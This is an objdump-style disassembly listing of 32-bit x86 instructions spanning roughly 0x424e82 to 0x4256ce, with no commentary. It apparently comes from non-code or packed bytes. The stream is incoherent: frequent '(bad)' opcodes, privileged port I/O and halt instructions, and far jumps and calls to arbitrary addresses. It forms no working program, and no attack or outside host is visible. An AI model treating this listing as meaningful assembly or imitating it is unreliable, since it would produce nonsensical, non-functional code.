  424e82:	rep es stos DWORD PTR es:[edi],eax
  424e85:	fwait
  424e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e87:	and    al,0xa3
  424e89:	call   0x8b68a6a0
  424e8e:	mov    esi,0xc9111baa
  424e93:	popa   
  424e94:	or     eax,0xde0274b
  424e99:	scas   al,BYTE PTR es:[edi]
  424e9a:	xor    al,0x1b
  424e9c:	fsubr  st,st(3)
  424e9e:	pop    eax
  424e9f:	push   es
  424ea0:	add    al,0xfc
  424ea2:	outs   dx,BYTE PTR ds:[esi]
  424ea3:	hlt    
  424ea4:	(bad)  
  424ea6:	xchg   BYTE PTR [ecx-0x28],bh
  424ea9:	pop    ebp
  424eaa:	imul   ebx,DWORD PTR [ebx],0x5895c5c0
  424eb0:	mov    BYTE PTR [edx+0x5bff9a96],0x1c
  424eb7:	jb     0x424ec0
  424eb9:	adc    ecx,DWORD PTR [ecx]
  424ebb:	fisub  DWORD PTR [eax-0x3e]
  424ebe:	stc    
  424ebf:	push   es
  424ec0:	sub    di,bx
  424ec3:	iret   
  424ec4:	std    
  424ec5:	ss pop ss
  424ec7:	cmc    
  424ec8:	cmp    bh,bl
  424eca:	add    DWORD PTR ds:0x2db0fa69,edi
  424ed0:	outs   dx,DWORD PTR ds:[esi]
  424ed1:	sub    dh,BYTE PTR [esi+0x3a86f650]
  424ed7:	jne    0x424ecc
  424ed9:	mov    esp,0xf6f7819c
  424ede:	and    al,0x69
  424ee0:	jmp    0xa50273df
  424ee5:	lods   eax,DWORD PTR ds:[esi]
  424ee6:	into   
  424ee7:	adc    edx,esp
  424ee9:	sbb    al,0x7f
  424eeb:	sbb    al,0xfa
  424eed:	push   ebx
  424eee:	mov    edi,0x14ccb7d5
  424ef3:	ficom  WORD PTR [edi+ebx*1+0x38]
  424ef7:	push   ds
  424ef8:	sti    
  424ef9:	sub    al,0x1d
  424efb:	fs pop ds
  424efd:	jl     0x424f6a
  424eff:	sbb    BYTE PTR [ebp-0x8],dh
  424f02:	out    0xaf,eax
  424f04:	mov    cl,0x3
  424f06:	in     eax,dx
  424f07:	cld    
  424f08:	sub    eax,0x8cb8cfc9
  424f0d:	jo     0x424f67
  424f0f:	dec    edi
  424f10:	mov    ah,0x97
  424f12:	pop    esi
  424f13:	add    DWORD PTR [esp+edi*4],ebp
  424f16:	(bad)  
  424f17:	push   ebx
  424f18:	dec    ebx
  424f19:	dec    ebp
  424f1a:	daa    
  424f1b:	pop    esi
  424f1c:	or     BYTE PTR [esi-0x329bef52],bl
  424f22:	sbb    BYTE PTR [esp+ecx*1],ah
  424f25:	pop    ss
  424f26:	sahf   
  424f27:	js     0x424f98
  424f29:	xlat   BYTE PTR ds:[ebx]
  424f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f2b:	push   ebx
  424f2c:	fbld   TBYTE PTR [edx+0x77]
  424f2f:	sbb    eax,DWORD PTR [edx+0x709dd81e]
  424f35:	jmp    0x649b:0x467463fc
  424f3c:	repz or ch,bh
  424f3f:	fld    DWORD PTR [edi]
  424f41:	pop    ss
  424f42:	add    bh,BYTE PTR [esi]
  424f44:	in     eax,dx
  424f45:	and    esi,ecx
  424f47:	mov    dl,0xd2
  424f49:	jns    0x424f7c
  424f4b:	cld    
  424f4c:	popf   
  424f4d:	clc    
  424f4e:	in     al,dx
  424f4f:	loopne 0x424f0f
  424f51:	xor    BYTE PTR [ecx],cl
  424f53:	jnp    0x424f98
  424f55:	leave  
  424f56:	icebp  
  424f57:	rcl    DWORD PTR ds:0xb4935018,1
  424f5d:	std    
  424f5e:	rol    dh,0xcd
  424f61:	cmp    eax,0xd3deb72c
  424f66:	sub    eax,0x4e350d07
  424f6b:	jg     0x424fd9
  424f6d:	sbb    cl,BYTE PTR [eax]
  424f6f:	rcr    esi,cl
  424f71:	retf   0xca4e
  424f74:	in     al,0x20
  424f76:	push   0xf45e555a
  424f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f7c:	fisub  DWORD PTR [esi+0x2d]
  424f7f:	pop    edi
  424f80:	mov    dl,0xba
  424f82:	stos   BYTE PTR es:[edi],al
  424f83:	pop    edi
  424f84:	push   ss
  424f85:	sbb    BYTE PTR [ecx-0x44a94d9e],ah
  424f8b:	iret   
  424f8c:	test   al,0xc8
  424f8e:	inc    edx
  424f8f:	mov    ebx,0x4b7b5b30
  424f94:	and    dh,bl
  424f96:	jmp    0x424f99
  424f98:	push   ebp
  424f99:	repnz push 0x7d
  424f9c:	or     DWORD PTR [ebp+ecx*8-0x112fbbd4],esi
  424fa3:	xor    esi,esp
  424fa5:	mov    ch,0x44
  424fa7:	retf   
  424fa8:	sbb    ecx,DWORD PTR [edx+edx*8-0x6c37046b]
  424faf:	pop    esi
  424fb0:	inc    ecx
  424fb1:	fs pop esi
  424fb3:	aam    0xbc
  424fb5:	xchg   BYTE PTR [edi-0x79],dl
  424fb8:	lods   al,BYTE PTR ds:[esi]
  424fb9:	test   eax,0xa3d534b6
  424fbe:	test   BYTE PTR [eax+eiz*4-0x74],ch
  424fc2:	scas   eax,DWORD PTR es:[edi]
  424fc3:	xchg   ebx,eax
  424fc4:	cmp    eax,0xccf379e4
  424fc9:	jnp    0x425000
  424fcb:	and    BYTE PTR [edi+edi*8-0x95d1b2f],ah
  424fd2:	dec    edx
  424fd3:	jmp    0x1d7167a8
  424fd8:	jo     0x424fe4
  424fda:	xor    BYTE PTR [ebp-0xe],al
  424fdd:	pop    eax
  424fde:	or     esp,0xb10f0394
  424fe4:	mov    gs,esi
  424fe6:	retf   0x1513
  424fe9:	adc    ebp,ebx
  424feb:	aaa    
  424fec:	rcr    BYTE PTR [esp+eiz*2+0x2d],0xf7
  424ff1:	mov    edi,eax
  424ff3:	xor    BYTE PTR [ecx+0x13208821],dh
  424ff9:	sub    BYTE PTR [edi-0x1e92567b],cl
  424fff:	or     al,ch
  425001:	outs   dx,BYTE PTR ds:[esi]
  425002:	imul   edi,ebx,0xd1d6abb4
  425008:	mov    bl,0x54
  42500a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42500b:	adc    al,0xe4
  42500d:	std    
  42500e:	rol    dh,0xe4
  425011:	stos   DWORD PTR es:[edi],eax
  425012:	fsub   DWORD PTR [edx]
  425014:	push   edx
  425015:	mov    BYTE PTR [edi+0x43],ch
  425018:	mov    ch,0x14
  42501a:	sub    edi,DWORD PTR [eax]
  42501c:	pop    ecx
  42501d:	xor    edi,DWORD PTR [eax-0x32]
  425020:	push   ss
  425021:	imul   ebp,DWORD PTR [edi+ecx*1-0x66ceeb26],0x61
  425029:	(bad)  
  42502b:	or     DWORD PTR [edi+0x692fd0ac],edi
  425031:	in     al,0xc4
  425033:	mov    dl,0x29
  425035:	rcr    DWORD PTR [eax],0xa4
  425038:	sbb    ecx,DWORD PTR [esi]
  42503a:	mov    esp,0xf874f3bb
  42503f:	dec    ebx
  425040:	clc    
  425041:	or     eax,0x805039ea
  425046:	or     BYTE PTR fs:[eax-0x2bc9fc],al
  42504d:	mov    bl,0x2d
  42504f:	push   edi
  425050:	push   edi
  425051:	jmp    FWORD PTR [eax-0xaf92d73]
  425057:	and    edx,DWORD PTR [ebx]
  425059:	cmc    
  42505a:	xchg   edx,eax
  42505b:	mov    bl,0xfd
  42505d:	popf   
  42505e:	add    dl,BYTE PTR [eax]
  425060:	sub    ebx,DWORD PTR [esi]
  425062:	cmp    bh,BYTE PTR [edx]
  425064:	std    
  425065:	mov    edx,DWORD PTR [eax-0x3b]
  425068:	arpl   WORD PTR [eax-0x443322f6],si
  42506e:	pop    ebx
  42506f:	retf   0xb5cd
  425072:	cmp    esp,eax
  425074:	test   al,0x31
  425076:	fst    QWORD PTR [edx+0x53]
  425079:	icebp  
  42507a:	loope  0x425002
  42507c:	dec    esp
  42507d:	cmc    
  42507e:	cmc    
  42507f:	ficomp WORD PTR [edi]
  425081:	mov    ebx,0xe5a16981
  425086:	out    0xed,al
  425088:	cs or  al,0x92
  42508b:	mov    WORD PTR [ebx-0x1c],ax
  42508f:	(bad)  
  425091:	(bad)  
  425092:	jmp    0xdd581cd
  425097:	inc    esi
  425098:	lock leave 
  42509a:	mov    bl,0x37
  42509c:	test   eax,0x350e7218
  4250a1:	add    eax,0x83c56dc5
  4250a6:	sbb    BYTE PTR [ebp-0x54],dh
  4250a9:	into   
  4250aa:	icebp  
  4250ab:	es loop 0x425118
  4250ae:	in     al,0x8b
  4250b0:	sub    eax,0xa91893b3
  4250b5:	push   esp
  4250b6:	neg    BYTE PTR [esp+eiz*8-0x75]
  4250ba:	mov    dh,ch
  4250bc:	xlat   BYTE PTR ds:[ebx]
  4250bd:	adc    edx,ecx
  4250bf:	xor    DWORD PTR ds:0x783681fa,ebp
  4250c5:	mov    edx,0xd5442617
  4250ca:	(bad)  
  4250cb:	popa   
  4250cc:	jl     0x425089
  4250ce:	mov    al,0x22
  4250d0:	mov    BYTE PTR [ebx+0x5d854421],ch
  4250d6:	cmc    
  4250d7:	mov    esi,0x3615a5d9
  4250dc:	adc    bl,BYTE PTR [edx]
  4250de:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4250e0:	mov    ebx,0x29e692df
  4250e5:	fisttp WORD PTR [esi]
  4250e7:	jmp    0x63a7f3ec
  4250ec:	inc    edx
  4250ed:	mov    WORD PTR [edx+0x6291a302],es
  4250f3:	jno    0x4250e5
  4250f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250f6:	inc    ecx
  4250f7:	sbb    cl,bh
  4250f9:	jbe    0x4250f2
  4250fb:	push   edi
  4250fc:	shr    DWORD PTR [eax+0x3],cl
  4250ff:	jnp    0x42512b
  425101:	addr16 push ebx
  425103:	les    ebx,FWORD PTR [edx-0x66]
  425106:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  425108:	jb     0x4250a3
  42510a:	fld    TBYTE PTR [ebx+edx*1]
  42510d:	or     al,0x5a
  42510f:	fstp   st(2)
  425111:	mov    es,WORD PTR [ebx+0x64a2157f]
  425117:	sub    eax,esp
  425119:	cmc    
  42511a:	(bad)  
  42511b:	mov    ah,0x4
  42511d:	leave  
  42511e:	pushf  
  42511f:	imul   edx,DWORD PTR [ecx-0x48],0x74a993a7
  425126:	sbb    DWORD PTR [edi+0x2c],0x56b68420
  42512d:	cmp    DWORD PTR [edx-0x3f7da48e],0xffffffe8
  425134:	enter  0x18b8,0xab
  425138:	cmc    
  425139:	add    DWORD PTR [esi],edx
  42513b:	cmp    eax,0x99757ab2
  425140:	lock aaa 
  425142:	mov    al,ds:0x4897baa8
  425147:	test   DWORD PTR [ebx+0x51],ecx
  42514a:	repz bound edx,QWORD PTR [ecx+0x62]
  42514e:	into   
  42514f:	ret    
  425150:	pop    ss
  425151:	add    eax,0xa18cb115
  425156:	jl     0x42511a
  425158:	shr    ch,1
  42515a:	rcr    edx,cl
  42515c:	in     eax,dx
  42515d:	fsubp  st(7),st
  42515f:	push   0xffffff97
  425161:	or     al,0xc7
  425163:	adc    al,BYTE PTR [di-0x15a7]
  425168:	mov    dh,0xee
  42516a:	aad    0x63
  42516c:	scas   eax,DWORD PTR es:[edi]
  42516d:	iret   
  42516e:	mov    cl,0x44
  425170:	inc    edx
  425171:	pop    ebp
  425172:	dec    ebx
  425173:	in     al,0xed
  425175:	adc    esi,ecx
  425177:	add    ecx,DWORD PTR [edx-0x61]
  42517a:	inc    eax
  42517b:	mov    bh,0x9e
  42517d:	ins    DWORD PTR es:[edi],dx
  42517e:	dec    ecx
  42517f:	stos   BYTE PTR es:[edi],al
  425180:	or     eax,0x622360f8
  425185:	ss inc edi
  425187:	mov    bh,BYTE PTR ds:0x7d9edae2
  42518d:	inc    edi
  42518e:	out    dx,al
  42518f:	push   eax
  425190:	aas    
  425191:	sub    eax,0x78ced030
  425196:	xchg   ebx,eax
  425197:	es push ds
  425199:	xchg   BYTE PTR [eax-0x6beef90],al
  42519f:	mov    eax,0xf18e2819
  4251a4:	(bad)  
  4251a6:	into   
  4251a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251a8:	jo     0x425132
  4251aa:	mov    dh,0x2c
  4251ac:	jbe    0x425163
  4251ae:	in     eax,dx
  4251af:	leave  
  4251b0:	das    
  4251b1:	loopne 0x4251ec
  4251b3:	stos   BYTE PTR es:[edi],al
  4251b4:	inc    esp
  4251b5:	push   edi
  4251b6:	aas    
  4251b7:	sub    DWORD PTR [ecx+0x42],0xffffffa3
  4251bb:	mov    edi,0x96a0106d
  4251c0:	mov    eax,0x7efc1be9
  4251c5:	cmovp  eax,DWORD PTR [edx+0x1265af54]
  4251cc:	in     eax,dx
  4251cd:	xor    eax,0x9886b54
  4251d2:	outs   dx,BYTE PTR ds:[esi]
  4251d3:	add    al,0xde
  4251d5:	mov    bl,0x2f
  4251d7:	jmp    0x90b02f5e
  4251dc:	int3   
  4251dd:	cmp    eax,0xd6516baa
  4251e2:	call   0x4ec3cfc5
  4251e7:	or     ebp,eax
  4251e9:	jl     0x425192
  4251eb:	mov    al,ds:0xb4cfc7e3
  4251f0:	mov    cl,0xab
  4251f2:	in     al,0x90
  4251f4:	into   
  4251f5:	cmp    ah,BYTE PTR [edi+0x72]
  4251f8:	mov    edx,0x12e92771
  4251fd:	lsl    esi,si
  425200:	pusha  
  425201:	test   DWORD PTR [ebx-0x36301149],0xeaaf9c17
  42520b:	jge    0x4251d5
  42520d:	outs   dx,BYTE PTR ds:[esi]
  42520e:	jmp    0x42525f
  425210:	(bad)  
  425211:	in     al,dx
  425212:	add    BYTE PTR [edx+0x52],ch
  425215:	ins    DWORD PTR es:[edi],dx
  425216:	ret    
  425217:	push   eax
  425218:	inc    ecx
  425219:	test   DWORD PTR [eax],ebp
  42521b:	mov    edi,0xb7b3011
  425220:	fs push ecx
  425222:	sbb    ebx,0x22
  425225:	mov    DWORD PTR [ecx+0x6a],ebx
  425228:	ins    BYTE PTR es:[edi],dx
  425229:	cmp    ebx,0xadc3a571
  42522f:	fs out dx,al
  425231:	(bad)  [ecx-0x532ec299]
  425237:	pop    ss
  425238:	imul   edi,ebx,0x97a0ccc6
  42523e:	jg     0x4251f3
  425240:	push   eax
  425241:	push   0x4a255b3e
  425246:	sbb    DWORD PTR [esi-0x3bce9688],edi
  42524c:	adc    edx,0x89edbdb9
  425252:	pop    eax
  425253:	pop    es
  425254:	loop   0x42523b
  425256:	mov    es,WORD PTR [ecx-0x6c16a008]
  42525c:	std    
  42525d:	mov    WORD PTR [eax+eax*2+0x68],cs
  425261:	xor    edi,edx
  425263:	and    eax,0x2971043
  425268:	xchg   ecx,eax
  425269:	and    ebp,DWORD PTR [esi-0x5fdc2c0]
  42526f:	jbe    0x4252c9
  425271:	dec    esi
  425272:	and    eax,0xa698629d
  425277:	cmc    
  425278:	mov    edx,0x192ee3fe
  42527d:	dec    esp
  42527e:	xor    eax,0x57cf3901
  425283:	ss test DWORD PTR fs:[edx-0x58],0x9afa6a8a
  42528c:	ins    BYTE PTR es:[edi],dx
  42528d:	inc    bp
  42528f:	jae    0x42521c
  425291:	xor    DWORD PTR ds:0xa1043a47,eax
  425297:	pop    ss
  425298:	scas   eax,DWORD PTR es:[edi]
  425299:	adc    ch,BYTE PTR [edi-0x2e]
  42529c:	(bad)  
  42529d:	ficom  WORD PTR [edi]
  42529f:	sbb    eax,0x97cf92df
  4252a4:	and    al,0x2e
  4252a6:	xor    eax,0x9706f9a5
  4252ab:	or     BYTE PTR ds:0x795eaacd,cl
  4252b1:	ja     0x4252bd
  4252b3:	sbb    DWORD PTR [ebx-0x3730be96],ebx
  4252b9:	fild   WORD PTR [ecx+0x29]
  4252bc:	scas   al,BYTE PTR es:[edi]
  4252bd:	outs   dx,DWORD PTR ds:[esi]
  4252be:	mov    BYTE PTR [ecx-0x74],dl
  4252c1:	into   
  4252c2:	sbb    al,0xad
  4252c4:	mov    bl,0x69
  4252c6:	adc    ebp,DWORD PTR [esi+esi*4-0x4a0f370d]
  4252cd:	cmp    al,0xc2
  4252cf:	sub    dl,BYTE PTR [edi+eiz*1]
  4252d2:	outs   dx,BYTE PTR ds:[esi]
  4252d3:	mov    esi,0x497f78e8
  4252d8:	daa    
  4252d9:	in     eax,dx
  4252da:	mov    ebp,0xce9e12b8
  4252df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252e0:	adc    al,al
  4252e2:	pop    edx
  4252e3:	xor    bl,bh
  4252e5:	inc    esp
  4252e6:	or     ebp,edx
  4252e8:	mov    ebx,0x1cf17d45
  4252ed:	pop    ecx
  4252ee:	dec    edx
  4252ef:	add    BYTE PTR [ebx],ch
  4252f1:	push   eax
  4252f2:	fcom   st(7)
  4252f4:	dec    edx
  4252f5:	stos   BYTE PTR es:[edi],al
  4252f6:	ficomp DWORD PTR [edx+0x6d]
  4252f9:	cwde   
  4252fa:	add    eax,0xbe350e52
  4252ff:	jmp    0x5519aa0e
  425304:	(bad)  
  425305:	pop    ecx
  425306:	cdq    
  425307:	ss add dh,0x9c
  42530b:	repnz mov ebp,0xf53101b5
  425311:	retf   
  425312:	sahf   
  425313:	pop    edi
  425314:	imul   esi,eax,0x938803b7
  42531a:	pop    ds
  42531b:	jecxz  0x42531b
  42531d:	pop    edi
  42531e:	rol    DWORD PTR [eax],cl
  425320:	mov    BYTE PTR [esi+0x3e],al
  425323:	and    BYTE PTR [edi],dh
  425325:	mov    ebp,0x1f234591
  42532a:	ds cwde 
  42532c:	inc    eax
  42532d:	test   BYTE PTR [ebp-0x61],bl
  425330:	(bad)  
  425331:	ss jb  0x425308
  425334:	push   eax
  425335:	test   BYTE PTR [ecx],0x71
  425338:	inc    ebp
  425339:	jmp    0xb3125502
  42533e:	stc    
  42533f:	mov    ch,dl
  425341:	(bad)  
  425342:	lock dec edi
  425344:	push   eax
  425345:	cmp    dh,dl
  425347:	mov    ecx,0xbf45c25f
  42534c:	push   ebp
  42534d:	sub    edx,DWORD PTR [edx+eax*8-0x52]
  425351:	adc    BYTE PTR [ecx+0x2d],dh
  425354:	shl    DWORD PTR [edx-0x61],cl
  425357:	mov    bl,0x46
  425359:	sbb    BYTE PTR [edx+0x68],ch
  42535c:	pop    DWORD PTR [esi]
  42535e:	arpl   si,si
  425360:	inc    edi
  425361:	dec    eax
  425362:	push   ecx
  425363:	cwde   
  425364:	dec    ebp
  425365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425366:	push   esi
  425367:	mov    dl,0x0
  425369:	inc    esi
  42536a:	add    cl,BYTE PTR [esi]
  42536c:	mov    bl,dh
  42536e:	xor    dh,BYTE PTR [edi+0x309b3552]
  425374:	pop    edi
  425375:	or     DWORD PTR [edi],edi
  425377:	pop    ds
  425378:	mov    bh,0x90
  42537a:	std    
  42537b:	dec    ecx
  42537c:	adc    al,0xf6
  42537e:	cwde   
  42537f:	jle    0x4253f6
  425381:	jo     0x425344
  425383:	hlt    
  425384:	test   eax,0xecef60fc
  425389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42538a:	adc    al,0x29
  42538c:	out    dx,eax
  42538d:	mov    bh,0xba
  42538f:	loope  0x4253da
  425391:	(bad)  
  425392:	jmp    0xfd60264f
  425397:	sub    DWORD PTR cs:[ebx+0x21efa3bc],0x6d50fd9e
  4253a2:	mov    ah,0x23
  4253a5:	and    edx,DWORD PTR gs:[edx+0x74e64fe6]
  4253ac:	push   ebp
  4253ad:	jmp    0xf691a38
  4253b2:	stos   BYTE PTR es:[edi],al
  4253b3:	sbb    al,0x35
  4253b5:	xchg   edx,eax
  4253b6:	mov    DWORD PTR [ebx-0x696e0336],ebp
  4253bc:	(bad)  
  4253bd:	ret    0x5ccf
  4253c0:	adc    dh,BYTE PTR [eax-0x3e]
  4253c3:	jp     0x42534d
  4253c5:	jae    0x4253b8
  4253c7:	bound  esi,QWORD PTR [edx+0xaeca068]
  4253cd:	jge    0x9ca72be3
  4253d3:	pop    ecx
  4253d4:	inc    ebx
  4253d5:	jle    0x42543a
  4253d7:	iret   
  4253d8:	cs ret 
  4253da:	test   DWORD PTR [eax-0x2f],esp
  4253dd:	add    al,0x2d
  4253df:	sub    di,WORD PTR [ebp-0x33]
  4253e3:	clc    
  4253e4:	and    dl,bh
  4253e6:	shl    DWORD PTR [ebp+0x2c9edf4a],cl
  4253ec:	cmc    
  4253ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ee:	lock stos DWORD PTR es:[edi],eax
  4253f0:	pop    esi
  4253f1:	adc    BYTE PTR [esi-0x44d9236a],dh
  4253f7:	xor    eax,0xeb4d860
  4253fc:	stos   BYTE PTR es:[edi],al
  4253fd:	mov    eax,0xf01afd06
  425402:	psubusb mm0,QWORD PTR [edx]
  425405:	inc    ebx
  425406:	push   es
  425407:	add    cl,BYTE PTR [eax-0x1a63b375]
  42540d:	dec    esi
  42540e:	cmp    ebp,DWORD PTR [ebp+0x6180a587]
  425414:	cwde   
  425415:	lock mov DWORD PTR [edx],ebp
  425418:	mov    dh,0x78
  42541a:	(bad)  
  42541b:	pop    edi
  42541c:	add    BYTE PTR [esi-0x31cbf23d],bl
  425422:	loopne 0x425459
  425424:	dec    ebx
  425425:	pop    esp
  425426:	imul   ecx,DWORD PTR [edi+edx*2+0x2725649b],0xffffffc5
  42542e:	dec    esp
  42542f:	sub    eax,0x765344ee
  425434:	sbb    DWORD PTR [edi-0x39999d53],0xea5d1483
  42543e:	rcr    BYTE PTR [esi],1
  425440:	push   esi
  425441:	sub    eax,DWORD PTR [esp+ecx*2]
  425444:	mov    eax,DWORD PTR [edi]
  425446:	mov    eax,0x592855bb
  42544b:	mov    ?,WORD PTR [eax+edi*8-0x78d10dd9]
  425452:	imul   ecx,DWORD PTR [edx-0x1c1ec158],0x56b739d6
  42545c:	dec    ecx
  42545d:	and    edx,eax
  42545f:	pop    ecx
  425460:	inc    edx
  425461:	push   ds
  425462:	xchg   ecx,eax
  425463:	mov    bl,0x9f
  425465:	fiadd  WORD PTR [ebp-0x1baf73]
  42546b:	mov    esp,0x7bb68aac
  425470:	call   0x342e:0xbf52029f
  425477:	bswap  ebp
  425479:	push   ebp
  42547a:	jns    0x4254d3
  42547c:	mov    cl,BYTE PTR [edi+edx*1-0x44]
  425480:	call   DWORD PTR [edi]
  425482:	aaa    
  425483:	mov    ch,0xa0
  425485:	mov    ebx,0x949d97bf
  42548a:	xchg   BYTE PTR [esi],cl
  42548c:	sbb    DWORD PTR [eax-0x25303671],ecx
  425492:	popf   
  425493:	ror    DWORD PTR [ebx],1
  425495:	xchg   edx,eax
  425496:	xor    al,dh
	...
  425514:	xor    eax,esp
  425516:	loope  0x4254d1
  425518:	icebp  
  425519:	mov    ecx,0xab3fe879
  42551e:	in     al,0x3
  425520:	test   al,0x31
  425522:	addr16 push edi
  425524:	sbb    eax,0x6c0001e8
  425529:	pop    es
  42552a:	add    BYTE PTR [eax],al
  42552c:	cmp    dh,dh
  42552e:	xlat   BYTE PTR ds:[ebx]
  42552f:	(bad)  
  425530:	lock call 0x2a60:0x6c1afff6
  425538:	mov    ch,0x3c
  42553a:	sti    
  42553b:	and    al,0x9c
  42553d:	fsub   QWORD PTR [edx+0x17]
  425540:	push   eax
  425541:	jmp    0x42558e
  425543:	clc    
  425544:	test   al,0x47
  425546:	pop    edi
  425547:	cmp    al,0x6e
  425549:	xchg   esp,eax
  42554a:	out    0xa5,al
  42554c:	inc    ebp
  42554d:	popa   
  42554e:	outs   dx,DWORD PTR ds:[esi]
  42554f:	or     bh,BYTE PTR [edx+0x44279459]
  425555:	pop    ebp
  425556:	dec    ebp
  425557:	pop    ss
  425558:	aaa    
  425559:	mov    edi,0xe68ca0f3
  42555e:	dec    ebx
  42555f:	les    ecx,FWORD PTR [ecx+0x1a5916cf]
  425565:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  425567:	or     eax,0xda01cca
  42556c:	pop    esp
  42556d:	stos   BYTE PTR es:[edi],al
  42556e:	test   eax,0xba54f274
  425573:	in     eax,dx
  425574:	jnp    0x425543
  425576:	xchg   esp,eax
  425577:	push   esp
  425578:	out    dx,eax
  425579:	pop    ecx
  42557a:	out    dx,eax
  42557b:	adc    BYTE PTR [edx+0x6c411a07],bl
  425581:	sub    BYTE PTR [ecx+0x37],al
  425584:	ret    0x38a2
  425587:	push   eax
  425588:	pop    ds
  425589:	ss dec si
  42558c:	mov    ah,0xa9
  42558e:	push   ebp
  42558f:	add    esi,edi
  425591:	out    dx,eax
  425592:	and    al,0xea
  425594:	nop
  425595:	xor    al,ch
  425597:	loop   0x4255c1
  425599:	fisub  WORD PTR [ecx+0x2483d76e]
  42559f:	and    eax,0x1c0b76ce
  4255a4:	pop    ss
  4255a5:	push   esp
  4255a6:	pop    ss
  4255a7:	in     al,dx
  4255a8:	jle    0x4255fa
  4255aa:	(bad)  
  4255ab:	pop    esp
  4255ac:	mov    esp,0xb3047ab3
  4255b1:	add    al,0x4a
  4255b3:	ss dec ecx
  4255b5:	sub    cl,cl
  4255b7:	inc    edx
  4255b8:	sahf   
  4255b9:	aaa    
  4255ba:	das    
  4255bb:	sbb    edx,edi
  4255bd:	imul   esi,DWORD PTR [edx-0x297336d5],0xf
  4255c4:	push   0xfffffff8
  4255c6:	mov    ah,0x74
  4255c8:	stos   BYTE PTR es:[edi],al
  4255c9:	dec    ebp
  4255ca:	lahf   
  4255cb:	fyl2x  
  4255cd:	or     al,0xf6
  4255cf:	out    0x5b,eax
  4255d1:	pop    ecx
  4255d2:	jg     0x4255be
  4255d4:	pop    edx
  4255d5:	cld    
  4255d6:	inc    ecx
  4255d7:	xchg   edx,eax
  4255d8:	icebp  
  4255d9:	sub    al,ch
  4255db:	cdq    
  4255dc:	pop    ecx
  4255dd:	sub    ebx,edi
  4255df:	pop    edx
  4255e0:	imul   edx,DWORD PTR [ebp-0x2caedce0],0xffffffae
  4255e7:	inc    esi
  4255e8:	fisubr DWORD PTR [ecx+ebx*1-0x40]
  4255ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255ed:	out    0xb1,eax
  4255ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255f0:	ja     0x425630
  4255f2:	ss dec esi
  4255f4:	clc    
  4255f5:	scas   al,BYTE PTR es:[edi]
  4255f6:	or     eax,0x9740547c
  4255fb:	add    BYTE PTR [esi],ah
  4255fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255fe:	stc    
  4255ff:	and    BYTE PTR gs:[eax],bl
  425602:	and    dl,bh
  425604:	fld    DWORD PTR [edx+0x56ae3b68]
  42560a:	fmul   st,st(1)
  42560c:	mov    ecx,0x2e0111e5
  425611:	shl    DWORD PTR [ebx-0x3c],1
  425614:	mov    dl,0x43
  425616:	(bad)  
  425617:	daa    
  425618:	pop    ecx
  425619:	or     DWORD PTR [edi-0x1],0xee36858c
  425620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425621:	mov    edx,DWORD PTR [ebx]
  425623:	mov    bh,0x34
  425625:	and    al,0xec
  425627:	aas    
  425628:	lock dec edx
  42562a:	retf   
  42562b:	icebp  
  42562c:	ins    BYTE PTR es:[edi],dx
  42562d:	push   ds
  42562e:	mov    bh,0x69
  425630:	in     eax,0xb3
  425632:	retf   
  425633:	fnstenv [eax+esi*2]
  425636:	inc    esi
  425637:	xchg   DWORD PTR [edi-0x7e011032],edx
  42563d:	dec    ecx
  42563e:	in     eax,dx
  42563f:	xchg   edx,eax
  425640:	mov    al,ds:0xd97c3fc5
  425645:	pop    ebp
  425646:	push   cs
  425647:	call   0x76d6f1aa
  42564c:	pop    edi
  42564d:	xor    al,0x6
  42564f:	mov    dl,0xa3
  425651:	xlat   BYTE PTR ds:[ebx]
  425652:	xchg   esp,eax
  425653:	(bad)  
  425654:	mov    ds,WORD PTR ds:[ebx-0x45b0ab8f]
  42565b:	xchg   bl,bh
  42565d:	cmp    edi,DWORD PTR [ebp-0x17240b02]
  425663:	mov    WORD PTR [ebp-0x789d2240],fs
  425669:	retf   
  42566a:	add    BYTE PTR ds:0xf1bb87f,bh
  425670:	cmp    edx,DWORD PTR [edi]
  425672:	pop    ss
  425673:	add    eax,DWORD PTR [edi+ecx*8-0x3b6187d2]
  42567a:	iret   
  42567b:	mov    bh,0xfc
  42567d:	pop    esi
  42567e:	pop    esi
  42567f:	push   ds
  425680:	xchg   DWORD PTR [ebx+0x33],ecx
  425683:	xchg   esi,eax
  425684:	lods   al,BYTE PTR ds:[esi]
  425685:	fiadd  WORD PTR [ebp+0x7e60f6d7]
  42568b:	mov    cl,BYTE PTR [edx-0x45]
  42568e:	bound  ecx,QWORD PTR [edi-0x379b21ff]
  425694:	sub    DWORD PTR [esi],esi
  425696:	call   0x27b6:0xe562cc10
  42569d:	cwde   
  42569e:	js     0x4256cc
  4256a0:	mov    esi,es
  4256a2:	fucompp 
  4256a4:	jg     0x425723
  4256a6:	ss (bad) 
  4256a8:	xor    al,0x81
  4256aa:	imul   edi,DWORD PTR ss:[ebx],0xffffffa2
  4256ae:	arpl   bx,bp
  4256b0:	pop    ecx
  4256b1:	fcmove st,st(4)
  4256b3:	rol    BYTE PTR [esp+eax*4],0x8f
  4256b7:	rcr    esi,0xc5
  4256ba:	mov    DWORD PTR [edx-0xc117a7a],esp
  4256c0:	outs   dx,DWORD PTR ds:[esi]
  4256c1:	sub    bl,BYTE PTR [ecx]
  4256c3:	pop    ecx
  4256c4:	adc    cl,dh
  4256c6:	test   BYTE PTR [edx+0x5d1d6a5a],bh
  4256cc:	xchg   ebx,eax
  4256cd:	lods   eax,DWORD PTR ds:[esi]
  4256ce:	xor    dl,BYTE PTR [edi]
